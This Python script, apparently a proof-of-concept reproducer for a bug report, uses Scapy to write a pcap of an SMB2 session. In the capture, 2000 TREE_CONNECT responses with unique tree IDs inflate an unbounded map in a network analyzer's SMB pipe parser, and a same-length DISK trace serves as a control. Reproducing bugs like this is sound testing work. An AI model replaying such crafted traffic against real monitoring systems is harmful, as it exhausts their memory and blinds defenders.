#!/usr/bin/env python3
"""Reproducer for Finding 050: unbounded tree_is_pipe_map growth.

One TCP/445 connection where the responder sends TREE_ID_COUNT SMB2
TREE_CONNECT responses, each with status=0 and a unique tree_id that is never
disconnected. A PIPE share type (share_type=2) makes smb-pipe.pac's
proc_smb2_tree_connect_response call set_tree_is_pipe(), inserting one entry per
tree_id into the unbounded tree_is_pipe_map. Flipping SHARE_TYPE to 1 (DISK)
produces a byte-length-identical control that never calls set_tree_is_pipe,
isolating the map cost.

Generated with OpenAI Codex, adapted with Claude Opus 4.8 to build packets with
Scapy's high-level API (NBTSession / SMB2 layers) and gzip-compress the highly
repetitive trace by default.
"""

import gzip
from pathlib import Path

from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether
from scapy.layers.netbios import NBTSession
from scapy.layers.smb2 import SMB2_Header, SMB2_Tree_Connect_Response
from scapy.packet import Raw
from scapy.utils import wrpcap

# Number of unique tree_ids the responder connects and never disconnects. Each
# one becomes a permanent tree_is_pipe_map entry under a PIPE share type -- well
# past the 1000-entry limit that would otherwise be expected to bound it.
TREE_ID_COUNT = 2000

# 2 = PIPE -> set_tree_is_pipe fires (the vulnerable path under test).
# 1 = DISK -> byte-length-identical control that never touches the map.
SHARE_TYPE = 2

# TREE_CONNECT responses packed into a single server TCP segment.
RESPONSES_PER_SEGMENT = 15

CLIENT_IP, SERVER_IP = "10.0.0.1", "10.0.0.2"
CLIENT_PORT, SERVER_PORT = 55555, 445
CLIENT_MAC, SERVER_MAC = "aa:aa:aa:aa:aa:aa", "bb:bb:bb:bb:bb:bb"

BASE_TIME = 1_700_000_000.0


def pkt(is_orig, seq, ack, flags, payload=b""):
    """Build one Ethernet/IP/TCP frame; Scapy fills in lengths and checksums."""
    if is_orig:
        eth = Ether(src=CLIENT_MAC, dst=SERVER_MAC)
        ip = IP(src=CLIENT_IP, dst=SERVER_IP)
        tcp = TCP(sport=CLIENT_PORT, dport=SERVER_PORT, seq=seq, ack=ack, flags=flags)
    else:
        eth = Ether(src=SERVER_MAC, dst=CLIENT_MAC)
        ip = IP(src=SERVER_IP, dst=CLIENT_IP)
        tcp = TCP(sport=SERVER_PORT, dport=CLIENT_PORT, seq=seq, ack=ack, flags=flags)

    frame = eth / ip / tcp
    if payload:
        frame = frame / Raw(load=payload)
    return frame


def tree_connect_response(tree_id):
    """One 84-byte NBSS + SMB2 TREE_CONNECT response with a unique tree_id."""
    smb = SMB2_Header(
        Command="SMB2_TREE_CONNECT",
        Flags="SMB2_FLAGS_SERVER_TO_REDIR",
        CreditsRequested=1,
        MID=tree_id,
        TID=tree_id,  # attacker-controlled map key
    ) / SMB2_Tree_Connect_Response(ShareType=SHARE_TYPE)
    return bytes(NBTSession() / smb)


def main():
    packets = []

    # Handshake.
    client_seq, server_seq = 0, 0
    packets.append(pkt(True, client_seq, 0, "S"))
    client_seq += 1
    packets.append(pkt(False, server_seq, client_seq, "SA"))
    server_seq += 1
    packets.append(pkt(True, client_seq, server_seq, "A"))

    # Responder streams the TREE_CONNECT responses in batched segments.
    for start in range(0, TREE_ID_COUNT, RESPONSES_PER_SEGMENT):
        end = min(start + RESPONSES_PER_SEGMENT, TREE_ID_COUNT)
        payload = b"".join(tree_connect_response(1 + i) for i in range(start, end))
        packets.append(pkt(False, server_seq, client_seq, "PA", payload))
        server_seq += len(payload)

    # Client acknowledges the outstanding server data, then both sides close.
    packets.append(pkt(True, client_seq, server_seq, "A"))
    packets.append(pkt(True, client_seq, server_seq, "FA"))
    client_seq += 1
    packets.append(pkt(False, server_seq, client_seq, "FA"))
    server_seq += 1
    packets.append(pkt(True, client_seq, server_seq, "A"))

    for index, p in enumerate(packets):
        p.time = BASE_TIME + index * 0.001

    out = gzip.GzipFile(Path(__file__).with_suffix(".gz"), "wb", mtime=0)
    wrpcap(out, packets)
    out.close()


if __name__ == "__main__":
    main()
